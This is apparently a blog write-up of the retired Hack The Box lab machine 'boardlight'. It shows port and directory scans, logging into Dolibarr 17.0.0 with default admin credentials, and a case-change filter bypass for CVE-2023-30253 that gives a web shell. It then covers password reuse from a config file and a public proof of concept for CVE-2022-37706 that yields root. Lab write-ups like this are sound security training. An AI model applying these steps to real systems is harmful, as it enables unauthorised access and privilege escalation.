---
layout: post
title: HTB - boardlight
date: 2025-03-10 08:56 -0400
---

{{ 'boardlight' | get_machine_avatar | raw }}

## nmap
```nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-27 14:00 -04
Nmap scan report for 10.10.11.11
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 062d3b851059ff7366277f0eae03eaf4 (RSA)
|   256 5903dc52873a359934447433783135fb (ECDSA)
|_  256 ab1338e43ee024b46938a9638238ddf4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 73.90 seconds
```

## subdomains
crm.boardlight.htb

## 404
apache default page

## dir bruteforce
```bash
~/workspace/projects/htb/retired_machines/boardlight » feroxbuster -u http://boardlight.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://boardlight.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://boardlight.htb/js => http://boardlight.htb/js/
301      GET        9l       28w      317c http://boardlight.htb/images => http://boardlight.htb/images/
301      GET        9l       28w      314c http://boardlight.htb/css => http://boardlight.htb/css/
200      GET      294l      635w     9426c http://boardlight.htb/contact.php
200      GET        9l       24w     2405c http://boardlight.htb/images/d-2.png
200      GET        6l       52w     1968c http://boardlight.htb/images/twitter.png
200      GET        5l       12w      847c http://boardlight.htb/images/envelope-white.png
200      GET        6l       57w     1878c http://boardlight.htb/images/youtube.png
200      GET        5l       55w     1797c http://boardlight.htb/images/linkedin.png
200      GET       11l       50w     2892c http://boardlight.htb/images/d-1.png
200      GET        7l       48w     3995c http://boardlight.htb/images/d-5.png
200      GET      714l     1381w    13685c http://boardlight.htb/css/style.css
200      GET      517l     1053w    15949c http://boardlight.htb/index.php
200      GET      348l     2369w   178082c http://boardlight.htb/images/map-img.png
200      GET      280l      652w     9100c http://boardlight.htb/about.php
200      GET      536l     2364w   201645c http://boardlight.htb/images/who-img.jpg
200      GET    10038l    19587w   192348c http://boardlight.htb/css/bootstrap.css
200      GET     4437l    10973w   131639c http://boardlight.htb/js/bootstrap.js
200      GET      517l     1053w    15949c http://boardlight.htb/
[####################] - 3m    106372/106372  0s      found:19      errors:52739
[####################] - 3m     26584/26584   136/s   http://boardlight.htb/
[####################] - 3m     26584/26584   137/s   http://boardlight.htb/js/
[####################] - 3m     26584/26584   137/s   http://boardlight.htb/images/
[####################] - 3m     26584/26584   137/s   http://boardlight.htb/css/
```

Nothing interesting.

### main page
![boardlight.htb](/assets/img/boardlight1.png)

Its a php site. Just a static site, no features. It does give two pieces of information:
- info@board.htb
- subdomain is board.htb not boardlight.htb

## crm.board.htb
![crm.boardlight.htb](/assets/img/boardlight2.png)

Dolibarr 17.0.0, its another php crm. This version is vulnerable to [CVE-2023-30253](https://www.swascan.com/security-advisory-dolibarr-17-0-0/). Default creds are `admin:admin` and they work here.
  
![crm.boardlight.htb](/assets/img/boardlight3.png)

Using the cve you just change `<?php` to `<?PHP` and all the filters are bypassed.
That gives the `www-data` shell.

Users that have a shell:
```
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

There is a password on `/html/crm.board.htb/htdocs/conf/conf.php` works for `larissa`.
```bash
larissa@boardlight:~$ cat user.txt
43876***************************
```

Linpeas shows some interesting suid binaries:
```bash
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  --->  Before_0.25.4_(CVE-2022-37706)
```

[CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) has a public poc that works as is.

```
larissa@boardlight:/tmp$ ./CVE-2022-37706.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
# cat /root/root.txt
004f2***************************
```
